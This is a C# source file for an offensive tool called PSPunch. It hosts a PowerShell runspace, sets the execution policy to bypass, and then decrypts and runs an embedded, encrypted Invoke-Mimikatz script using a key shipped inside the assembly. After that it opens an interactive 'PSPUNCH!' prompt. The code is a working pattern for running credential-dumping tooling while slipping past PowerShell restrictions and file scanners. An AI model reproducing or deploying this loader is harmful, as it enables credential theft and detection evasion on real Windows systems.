using System;
using System.Configuration;
using System.Management.Automation.Runspaces;
using PSPunch.CryptUtil;
using System.IO;
using System.Text;
using System.Reflection;
using PSPunch.PSPunchInput;

namespace PSPunch
{
    class Program
    {
        static PunchInput PSInit()
        {
            PunchInput punchInput = new PunchInput();
            punchInput.host = new PSPunchHost();
            Runspace runspace = RunspaceFactory.CreateRunspace(punchInput.host);
            runspace.Open();
            punchInput.runspace = runspace;
            punchInput.cmd = "set-executionpolicy bypass -Scope process -Force";
            Processing.PSExec(punchInput);
            return punchInput;

        }
        static void DisplayOutput(PunchInput punchInput) { }
        static void ImportModules(PunchInput punchInput, Stream moduleStream)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            StreamReader keyReader = new StreamReader(assembly.GetManifestResourceStream("PSPunch.Modules.key.txt"));
            string key = keyReader.ReadToEnd();
            MemoryStream decMem = FileTools.DecryptFile(moduleStream, key);
            punchInput.cmd = Encoding.Unicode.GetString(decMem.ToArray());
            Processing.PSExec(punchInput);
        }

        static void Main(string[] args)
        {
            string prompt = "PSPUNCH! #> ";
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.Clear();
            PunchInput punchInput = PSInit();
            Assembly assembly = Assembly.GetExecutingAssembly();
            Stream moduleStream = assembly.GetManifestResourceStream("PSPunch.Modules.invoke-mimikatz.ps1.enc");
            ImportModules(punchInput, moduleStream);

            while (true)
            {
                int consoleTopPos = Console.CursorTop;
                punchInput.loopPos = 0;
                punchInput.inLoop = false;
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(prompt);
                Console.ForegroundColor = ConsoleColor.Yellow;
                punchInput.keyInfo = Console.ReadKey();
                while (punchInput.keyInfo.Key != ConsoleKey.Enter)
                {
                    punchInput = Processing.CommandProcessor(punchInput);
                    if (punchInput.output != null)
                    {
                        Console.WriteLine("\n" + punchInput.output);
                        consoleTopPos = Console.CursorTop;
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.Write(prompt);
                        Console.ForegroundColor = ConsoleColor.Yellow;
                    }
                    Console.SetCursorPosition(prompt.Length, consoleTopPos);
                    Console.Write(new string(' ', Console.WindowWidth));
                    Console.SetCursorPosition(prompt.Length, consoleTopPos);
                    Console.Write(punchInput.cmd);
                    punchInput.keyInfo = Console.ReadKey();
                }
                if (punchInput.cmd == "exit")
                {
                    return;
                }
                if (punchInput.cmd == "clear")
                {
                    Console.Clear();
                    punchInput.cmd = null;
                }
                if (punchInput.cmd != null)
                {
                    punchInput = Processing.PSExec(punchInput);
                    Console.WriteLine("\n" + punchInput.output);
                }
            }
        }
    }
}